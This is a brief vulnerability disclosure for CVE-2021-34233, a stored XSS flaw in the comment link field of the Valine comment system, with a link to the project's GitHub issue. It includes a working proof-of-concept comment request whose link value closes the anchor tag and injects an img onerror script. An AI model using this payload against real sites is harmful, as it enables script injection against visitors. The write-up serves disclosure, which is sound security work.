# CVE-2021-34233

### Summary

Comment links are vulnerable to XSS



### Details

Submitting comments and grabbing packets with burpsuite



![](.\images\1.png)

poc

```python
{"comment":"1\n","nick":"test","mail":"test@163.com","link":"\" ></a><img src=x onerror=alert(1)>","ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0","url":"/faq.html","QQAvatar":"","ip":"2406:da14:727:6700:2746:774b:2b87:6dbe","insertedAt":{"__type":"Date","iso":"2021-06-03T15:59:08.981Z"},"ACL":{"*":{"read":true}}}
```

link payload is 

```python
\" ></a><img src=x onerror=alert(1)>
```



so result :

![](.\images\2.png)



### link

+ [评论链接存在XSS漏洞 · Issue #363 · xCss/Valine · GitHub](https://github.com/xCss/Valine/issues/363)

